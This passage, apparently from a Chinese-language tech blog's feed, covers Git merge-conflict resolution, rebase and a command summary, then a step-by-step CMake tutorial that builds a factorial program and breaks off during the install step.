没有简单地把分支指针右移，而是对三方合并后的结果重新做一个新的快照，并自动创建一个指向它的提交对象（C6），如下图。这个提交对象比较特殊，它有两个祖先（C4 和 C5）。</p><p>值得一提的是 GIT 可以自己裁决哪个共同祖先才是最佳合并基础；这和 CVS 或 Subversion（1.5 以后的版本）不同，它们需要开发者手工指定合并基础。所以此特性让 GIT 的合并操作比其他系统都要简单不少。<br><img src="40.png"></p><h2 id="遇到冲突时的分支合并"><a href="#遇到冲突时的分支合并" class="headerlink" title="遇到冲突时的分支合并"></a>遇到冲突时的分支合并</h2><p>有时候合并操作并不会如此顺利。如果在不同的分支中都修改了同一个文件的同一部分，GIT 就无法干净地把两者合到一起，这种问题只能由人来裁决。以上述合并 iss53 分支为例，如果你在处理分支 iss53 的时候，将得到类似下面的结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git merge iss53</span></span><br><span class="line">    Auto-merging index.html</span><br><span class="line">    CONFLICT (content): Merge conflict in index.html</span><br><span class="line">    Automatic merge failed; fix conflicts and then commit the result.</span><br></pre></td></tr></table></figure><p>GIT 作了合并，但没有提交，它会停下来等你解决冲突。要看看哪些文件在合并时发生冲突，可以用 <code>git status</code> 查阅：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git status</span></span><br><span class="line">    index.html: needs merge</span><br><span class="line">    # On branch master</span><br><span class="line">    # Changes not staged for commit:</span><br><span class="line">    # (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)</span><br><span class="line">    # (use &quot;git restore &lt;file&gt;...&quot; to discard changes in working directory)</span><br><span class="line">    #</span><br><span class="line">    # unmerged: index.html</span><br><span class="line">    #</span><br></pre></td></tr></table></figure><p>任何包含未解决冲突的文件都会以<strong>未合并（unmerged）</strong> 的状态列出。GIT 会在有冲突的文件里加入标准的冲突解决标记，可以通过它们来手工定位并解决这些冲突。可以看到此文件包含类似下面这样的部分：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD:index.html</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;footer&quot;</span>&gt;</span>contact : email.support@github.com<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    =======</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;footer&quot;</span>&gt;</span></span><br><span class="line">    please contact us at support@github.com</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    &gt;&gt;&gt;&gt;&gt;&gt;&gt; iss53:index.html</span><br></pre></td></tr></table></figure><p>可以看到 =======  隔开的上半部分，是 HEAD（即 master 分支，在运行 merge 命令时所切换到的分支）中的内容，下半部分是在 iss53 分支中的内容。解决冲突的办法无非是二者选其一或者由你亲自整合到一起。比如你可以通过把这段内容替换为下面这样来解决：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;footer&quot;</span>&gt;</span></span><br><span class="line">    please contact us at email.support@github.com</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这个解决方案各采纳了两个分支中的一部分内容，而且我还删除了 &lt;&lt;&lt;&lt;&lt;&lt;&lt;，======= 和 &gt;&gt;&gt;&gt;&gt;&gt;&gt; 这些行。在解决了所有文件里的所有冲突后，运行 git add 将把它们标记为<strong>已解决状态</strong>，实际上就是来一次快照保存到暂存区域。因为一旦暂存，就表示冲突已经解决。再运行一次 <code>git status</code> 来确认所有冲突都已解决：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git status</span></span><br><span class="line">    # On branch master</span><br><span class="line">    # Changes to be committed:</span><br><span class="line">    # (use &quot;git reset HEAD &lt;file&gt;...&quot; to unstage)</span><br><span class="line">    #</span><br><span class="line">    # modified: index.html</span><br><span class="line">    #</span><br></pre></td></tr></table></figure><p>如果觉得满意了，则可以直接提交。</p><h2 id="采用-rebase-来合并分支"><a href="#采用-rebase-来合并分支" class="headerlink" title="采用 rebase 来合并分支"></a>采用 rebase 来合并分支</h2><p>把一个分支中的修改整合到另一个分支的办法有两种：<strong>merge</strong> 和 <strong>rebase</strong>。</p><p>假设当前的分支状态如下：<br><img src="41.png"></p><p>最容易合并分支的方法是 merge 命令，它会把两个分支最新的快照（C3 和 C4）以及二者最新的共同祖先（C2）进行三方合并，合并的结果是产生一个新的提交对象（C5）。如图：<br><img src="42.png"></p><p>而采用 <strong>rebase</strong> 的方式也可以进行分支合并，其实际上就是把在 C3 里产生的变化补丁在 C4 的基础上重新打一遍。<font color=red><strong>有了 rebase 命令，就可以把在一个分支里提交的改变移到另一个分支里重放一遍</strong>。</font><br>在这个例子里，运行如下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git checkout experiment</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git rebase master</span></span><br><span class="line">    First, rewinding head to replay your work on top of it...</span><br><span class="line">    Applying: added staged command</span><br></pre></td></tr></table></figure><p><strong>它的原理是回到两个分支最近的共同祖先，根据当前分支（也就是要进行 rebase 的分支 experiment）后续的历次提交对象（这里只有一个 C3），生成一系列文件补丁，然后以基底分支（也就是主干分支 master）最后一个提交对象（C4）为新的出发点，逐个应用之前准备好的补丁文件，最后会生成一个新的合并提交对象（C3’），从而改写 experiment 的提交历史，使它成为 master 分支的直接下游。</strong><br><img src="43.png"></p><p>然后再回到 master，进行一次 fast forward 合并。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git checkout master</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git merge experiment</span> </span><br></pre></td></tr></table></figure><p><img src="44.png"></p><p>现在的 C3’ 对应的快照，其实和普通的三方合并，即上个例子中的 C5 对应的快照内容一模一样了。虽然最后整合得到的结果没有任何区别，但衍合能产生一个<strong>更为整洁</strong>的提交历史。如果视察一个 rebase 过的分支的历史记录，看起来会更清楚：仿佛所有修改都是在一根线上先后进行的，尽管实际上它们原本是同时并行发生的。</p><p>一般我们使用 rebase 的目的，是想要得到一个能在远程分支上干净应用的补丁 — 比如某些项目你不是维护者，但想帮点忙的话，最好用 rebase：先在自己的一个分支里进行开发，当准备向主项目提交补丁的时候，根据最新的 origin/master 进行一次 rebase 操作然后再提交，这样维护者就不需要做任何整合工作（实际上是把解决分支补丁同最新主干代码之间冲突的责任，化转为由提交补丁的人来解决），只需根据你提供的仓库地址作一次快进合并，或者直接采纳你提交的补丁。</p><p>请注意，合并结果中最后一次提交所指向的快照，无论是通过 rebase，还是 merge 合并，都会得到相同的快照内容，只不过提交历史不同罢了。rebase 是按照每行的修改次序重演一遍修改，而合并是把最终结果合在一起。</p><hr><h1 id="命令汇总"><a href="#命令汇总" class="headerlink" title="命令汇总"></a>命令汇总</h1><p><code>git init</code>：初始化一个仓库<br><code>git add &lt;files&gt;</code>：将文件暂存，文件会被标记为<strong>已追踪</strong>状态<br><code>git commit -m &quot;comments&quot;</code>：提交暂存区中的记录<br><code>git restore &lt;file&gt;</code>：回撤<strong>工作区</strong>相对于 <strong>GIT 仓库</strong> 的修改<br><code>git restore --staged &lt;file&gt;</code>：回撤<strong>工作区</strong>相对于<strong>暂存区</strong>的修改<br><code>git diff</code>：查看<strong>工作区</strong>相对于<strong>暂存区</strong>的变化<br><code>git diff --cached</code>：查看 <strong>暂存区</strong>相当于 <strong>GIT 仓库</strong>的变化<br><code>git rm &lt;files&gt;</code>：删除某个文件及其记录（在工作目录中也删除了）<br><code>git rm --cached &lt;files&gt;</code>：删除某个文件在 <strong>GIT 仓库</strong>中的记录（不会删除工作目录中的文件）<br><code>git mv &lt;file_name&gt; &lt;file_rename&gt;</code>：移动（重命名）某个文件<br><code>git log</code>：查看 GIT 仓库的提交记录<br><code>git reflog</code>：查看 HEAD 指针的操作记录<br><code>git reset [--mixed|--soft|--hard] [HEAD|sha-1]</code>：版本回退，将 HEAD 指针重置到某个版本处<br><code>git revert &lt;commit&gt;</code>：撤销某次提交<br><code>git branch &lt;branch_name&gt;</code>：在当前的 <strong>commit</strong> 对象处创建一个分支指针<br><code>git branch</code>：查看分支信息<br><code>git branch -d &lt;branch_name&gt;</code>：删除某个分支<br><code>git branch --merged</code>：查看<strong>已经合并</strong>到当前分支中的分支<br><code>git branch --no-merged</code>：查看<strong>未合并</strong>到当前分支中的分支<br><code>git checkout &lt;branch_name&gt;</code>：切换到某个分支<br><code>git checkout -b &lt;branch_name&gt;</code>：创建并且切换到某个分支<br><code>git merge &lt;branch_name&gt;</code>：将 branch_name 合并到当前分支<br><code>git rebase &lt;branch_name&gt;</code>：将当前分支上的改动整合到 branch_name 所指向的分支上去，并基于 branch_name 所指向分支创建新的提交记录，将当前分支指向到该提交记录</p><hr><blockquote><p>参考资料：《Pro Git》</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 常用工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CMake 入门</title>
      <link href="/2021/10/21/tools-cmake/"/>
      <url>/2021/10/21/tools-cmake/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>如果你是一个刚刚接触 C/C++ 编程的程序员，也许你会用类似于 VS 的集成开发环境写代码，一键编译运行；如果你开始学习 Linux 下的编程，也许你会开始使用 GCC 编译器在命令行中编译自己的代码；如果你开始编写一些稍微有些规模的项目，项目由若干个源文件和头文件组成，甚至可能用到其他的第三方库，也许你开始利用 Makefile 脚本来管理自己的项目，但是 Makefile 只能用于Linux环境下的开发，你的项目可能无法跨平台在Windows或者Mac上构建。而 CMake 就是一个跨平台的安装（编译）工具，可以用简单的语句来描述所有的安装(编译过程)， CMake 通过解析 CMakeLists.txt 文件来生成某个系统环境下的构建系统（比如 Linux 下的 makefile ，Windows 下的 VS 解决方案工程文件等），所以学习的关键就是学习怎么写 CMakeLists.txt。本文着重记录作为一名新手的 CMake 入门之路！！</p><blockquote><p><strong>工程环境</strong><br>操作系统： Ubuntu 18.04<br>CMake版本： 3.19.7<br>工作目录：~/cmake_tutorial</p><p>[注]：本文通过一步步构建一个可以计算阶乘的项目，逐步引入CMake中各种指令的常见用法，对于更高阶的用法，可以参考CMake官方文档。<br>[注]：<font color='purple'><strong><a href="https://github.com/wenchuansun/cmake_tutorial">代码github仓库</a></strong></font></p></blockquote><hr><h1 id="Tutorial-1：一个简单的项目-Factorial"><a href="#Tutorial-1：一个简单的项目-Factorial" class="headerlink" title="Tutorial 1：一个简单的项目 Factorial"></a>Tutorial 1：一个简单的项目 Factorial</h1><p>首先我们在工作目录下建立一个 Tutorial1 目录用以存放我们这一小节的文件，进入该目录，然后在 Tutorial1 目录下编写一个 factorial.cpp 文件，其目标是生成一个可以求解 20 以内整数阶乘的程序，源代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// factorial.cpp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Usage: \n      factorial &lt;integer1&gt; &lt;integer2&gt; ...&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; argc; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> temp = <span class="built_in">atoi</span>(argv[i]);</span><br><span class="line">        <span class="comment">// 小于0的整数无阶乘</span></span><br><span class="line">        <span class="keyword">if</span> (temp &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;Integer &quot;</span> &lt;&lt; temp &lt;&lt; <span class="string">&quot; is negative, no factorial!&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//大于20的整数会溢出导致无法计算</span></span><br><span class="line">        <span class="keyword">if</span> (temp &gt; <span class="number">20</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;Integer &quot;</span> &lt;&lt; temp &lt;&lt; <span class="string">&quot; is too large, no way to calculate!&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;The factorial of &quot;</span> &lt;&lt; temp &lt;&lt; <span class="string">&quot; is &quot;</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fact = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 计算阶乘</span></span><br><span class="line">        <span class="keyword">while</span> (temp != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            fact *= temp;</span><br><span class="line">            --temp;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; fact &lt;&lt; <span class="string">&quot;!&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在和 factorial.cpp 文件同级的目录下创建一个文件 CMakeLists.txt ，键入如下内容：<br><img src="1.png"></p><p>其内容仅仅由三句指令构成，<code>cmake_minimum_required()</code> 指令用以检查系统所用的 CMake 版本，若当前版本不满足要求的最小版本，则会停止处理且报错，同时该命令会将变量 <strong>CMAKE_MINIMUM_REQUIRED_VERSION</strong> 的值设置为最小版本号，通常来说，该命令一般写在整个 CMakeLists.txt 的开头；<code>project()</code> 指令用以给当前的项目设置项目名，同时还可以设置版本号，这些信息都会被存入到 CMake 的内置变量中；<code>add_executable()</code>  则是关键的用以创建目标程序的指令，在我们的例子中，我们希望通过源文件 factorial.cpp 生成目标程序 factorial 。到此为止，基本的代码文件都写好了，运行 CMake 则可以生成一个构建系统，在生成的过程中，CMake 可能会生成一系列的中间文件，因此，为了保持目录的清晰工整，我们在当前目录下创建一个 build 目录，将构建工作在该目录下进行，这也被称为<strong>源外构建（out-of-source）</strong>。</p><p>此时，我们当前目录下的文件列表如下：<br><img src="2.png"></p><p>然后，我们运行如下命令来生成构建系统，同时构建项目。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> build</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cmake -S ../ -B ./</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make</span></span><br></pre></td></tr></table></figure><p>其中，<code>-S</code> 和 <code>../</code> 选项代表源文件所在的目录，而 <code>-B</code> 和 <code>./</code> 选项代表构建目录。运行以上命令后查看 build 文件夹：<br><img src="3.png"></p><p>运行 cmake 命令后会生成几个中间文件（暂时不用关注其生成的中间文件），其中最重要的就是 Makefile 文件，根据该 Makefile 文件，运行 make 则可以生成目标程序 <font color=gree><strong>factorial</strong></font>。</p><hr><h1 id="Tutorial-2：为项目添加配置信息"><a href="#Tutorial-2：为项目添加配置信息" class="headerlink" title="Tutorial 2：为项目添加配置信息"></a>Tutorial 2：为项目添加配置信息</h1><p>首先我们在工作目录下建立一个 Tutorial2 目录用以存放我们这一小节的文件，进入该目录。一般在项目中，项目会有一些配置信息，不妨假设我们现在要在目标程序中输出我们项目的版本信息。根据惯例，项目的配置信息一般存放在一个特定的 Config 文件内，首先创建一个文件 factorialConfig.h.in ，输入以下代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Factorial_VERSION_MAJOR $&#123;Factorial_VERSION_MAJOR&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Factorial_VERSION_MINOR $&#123;Factorial_VERSION_MINOR&#125;</span></span><br></pre></td></tr></table></figure><p>然后在上一节的基础上将 CMakeLists.txt 修改为如下：<br><img src="4.png"></p><p>其中新增加了两条指令，<code>configure_file()</code> 指令用于生成文件，将第一个参数对应的文件内容复制到第二个参数对应的文件内，同时将对CMake中变量的引用替换为变量的值，通过该命令，会在构建目录下生成一个头文件 factorial.h，其中有两条宏定义指令，包含了文件的版本配置信息；<code>target_include_directories() </code> 指令用来指定特定目标 include 路径，由于生成的配置信息头文件在构建目录下，为了找到该头文件，则需要指定头文件的搜索路径，此处将项目的构建目录添加到头文件搜索路径中以找到  factorial.h 文件。其中 ${PROJECT_BINARY_DIR} 表示对变量的 <strong>PROJECT_BINARY_DIR</strong> 的使用， 该变量是一个 CMAKE 内置变量，对于变量引用的语法是 <code> $&#123;VAR&#125;</code>。<br>然后修改我们的源代码，用以输出版本信息：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (argc &lt; <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        std::cout &lt;&lt; argv[<span class="number">0</span>] &lt;&lt; <span class="string">&quot; Version &quot;</span> &lt;&lt; Factorial_VERSION_MAJOR &lt;&lt; <span class="string">&quot;.&quot;</span></span><br><span class="line">            &lt;&lt; Factorial_VERSION_MINOR &lt;&lt; std::endl;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Usage: \n      factorial &lt;integer1&gt; [integer2] ...&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>采用同样的方式使用 cmake 命令和 make 命令，生成可执行文件 <font color=gree><strong>factorial</strong></font>。有一个不同的点是，我们可以看到在 build 目录下，会有一个 .h 文件生成，该文件则由是 <code>configure_file()</code> 指令利用 factorial.h.in 所生成：<br><img src="5.png"></p><p>运行 <font color=gree><strong>factorial</strong></font> ，可以看到打印出了版本信息。<br><img src="6.png"></p><hr><h1 id="Tutorial-3：添加一个库"><a href="#Tutorial-3：添加一个库" class="headerlink" title="Tutorial 3：添加一个库"></a>Tutorial 3：添加一个库</h1><p>我们使用 long long 类型的变量来存放阶乘的结果，在当前机器上其仅仅占用 8 个字节，所以只能正确的计算 20 以内的阶乘，于是为了计算更大数字的阶乘，采用另外一种策略，编写了一个库文件来计算更大数字的阶乘。在当前的工作目录下创建 Tutorial3 目录，进入 Tutorial3 ，创建目录 ExtensibleFactorial 用来存放我们的计算阶乘的库文件。在该目录下有一个三个文件，分别是 MyFactorial.h，MyFactorial.cpp 和 CMakeLists.txt ，且通过 CMakeLists.txt 来生成库 <strong>ExtensibleFactorial</strong> ，该库可以用来计算大于 20 且小于 3249 的阶乘。CMakeLists.txt 内容仅仅包含一条指令：<br><img src="7.png"></p><p><code>add_library()</code> 指令类似于 <code>add_executable()</code> 指令，其功能是生成库文件，第一个参数指定生成的库文件，我们此处指定生成库文件 <strong>ExtensibleFactorial</strong> ，第二个参数为库文件依赖的源文件，此处为 myFactorial.cpp 。</p><p>为了实现可选的使用我们的阶乘库，修改顶层的 CMakeLists 文件如下：<br><img src="8.png"></p><p>首先在第 6 行出现一个新的指令 <code>option()</code>，该指令用来添加一个 CMAKE 选项供用户选择，用户可以在运行 cmake 的时候通过 -D 来设置选项的值，此处添加一个选项 <strong>USE_MYFACTORIAL</strong>，并且将其默认初始化为 OFF，如果用户在运行 cmake 生成构建系统的时候未指定该选项的值，则将其默认设置为 OFF。在 11-16 行，一个 <code>if()</code> 语句通过选项 <strong>USE_MYFACTORIAL</strong> 来判定是否在程序中使用阶乘库，如果 <strong>USE_MYFACTORIAL</strong> 被置为 ON，则执行 if 内的语句块。<code>add_subdirectory()</code> 指令用来告诉 cmake 到指定的目录寻找 CMakeList.txt，并且解释它。该处则通过此指令来添加 <strong>ExtensibleFactorial</strong> 构建命令。由于我们使用的是库，所以在编译过后需要去链接它，<code>target_link_libraries()</code> 指令用来指定目标所需要链接的库的名称。</p><p>修改 factorial.cpp，来使用阶乘库。主要修改的代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line: 5-7</span></span><br><span class="line"><span class="comment">// 首先要使用阶乘库提供的接口，需要包含头文件</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> USE_MYFACTORIAL</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;myFactorial.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// line: 29-33</span></span><br><span class="line"><span class="comment">// 因为阶乘库可计算的范围在0-3248之间，需要和原来的阶乘范围区分开</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> USE_MYFACTORIAL</span></span><br><span class="line">        <span class="keyword">if</span> (temp &gt; <span class="number">3248</span>)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> </span></span><br><span class="line">        <span class="keyword">if</span> (temp &gt; <span class="number">20</span>)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// line: 41-51</span></span><br><span class="line"><span class="comment">// 核心代码：如果使用阶乘库的话，则调用阶乘库接口</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> USE_MYFACTORIAL</span></span><br><span class="line">        <span class="built_in">myFactorial</span>(temp);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fact = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (temp != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            fact *= temp;</span><br><span class="line">            --temp;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; fact &lt;&lt; <span class="string">&quot;!&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>到此处，你一定很好奇在源码文件中宏 <strong>USE_MYFACTORIAL</strong> 是怎么来的，因为我们前面仅仅提到在 CMakeList 中定义并使用他，但这似乎和源文件没什么关系。奇妙之处就在于其实还有一处修改在配置文件中：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Factorial_VERSION_MAJOR $&#123;Factorial_VERSION_MAJOR&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Factorial_VERSION_MINOR $&#123;Factorial_VERSION_MINOR&#125;</span></span><br><span class="line"><span class="meta">#cmakedefine USE_MYFACTORIAL</span></span><br></pre></td></tr></table></figure><p>在配置文件中使用 <code>#cmakedefine VAR</code> 添加了一行代码，该处的代码的作用在官网文档的解释如下：<br><img src="9.png"></p><p>接下来，我们通过 cmake 来生成构建系统，并编译：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mkdir build</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> build</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 为了使用阶乘库，通过-D将USE_MYFACTORIAL选项设置为ON</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cmake -DUSE_MYFACTORIAL=ON -S ../ -B ./</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make</span></span><br></pre></td></tr></table></figure><p>可以检查一下生成的配置信息头文件，果然生成了 <code>#define USE_MYFACTORIAL</code><br><img src="10.png"></p><p>运行 <font color=gree><strong>factorial</strong></font>， 成功输出！！！！<br><img src="11.png"></p><hr><h1 id="Tutorial-4：安装工程"><a href="#Tutorial-4：安装工程" class="headerlink" title="Tutorial 4：安装工程"></a>Tutorial 4：安装工程</h1><p>在上述实践中，每次编译好工程，生成的可执行程序和库都在 build 文件夹内，但是我们希望可以把他们安装到指定的目录中，以便更方便的调用，接下来我们实验 CMake 的安装指令 <code>install()</code> ，通过该指令安装我们的工程。对于库 <strong>ExtensibleFactorial</strong> ，我们希望安装其静态库文件和头文件，对于目标程序，我们希望安装其可执行文件和相应的配置文件</p><p>首先为了安装库文件，在 ./ExtensibleFactorial/CMakeLists.txt 中的末尾添加如下指令：<br><img src="12.png"></p><p>为了安装可执行文件 <font color=gree><strong>factorial</strong></font> ， 在 ./CMakeLists.txt 中的末尾添加如下指令：<br><img src="13.png"></p><p>其中 <code>install()</code> 是为了给我们构建工具生成安装规则的指令，例如 <code>make install</code> 即通过 makefile 中的安装规则来安装工程，那么在 Linux 平台，<code>install()</code> 指令就会生成 makefile 的安装规则。该指令的 DESTINATION 选项则指定将目标安装到的目录，同时可以通过 <strong>CMAKE_INSTALL_PREFIX</strong> 该 cmake 变量来指定安装目录的前缀，其在 Linux 下的默认值是 <code>/usr/local</code>。<br>在当前的 Tutorial4 目录下创建一个 build 目录，用于生成构建系统；创建一个 dist 目录，用来存放待安装的文件。分别执行如下命令来完成生成、构建和安装的过程：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> build</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用可求解大数阶乘的库</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cmake -DUSE_MYFACTORIAL=ON ..</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 相当于执行了make</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cmake --build .</span> </span><br><span class="line"><span class="meta">#</span><span class="bash"> 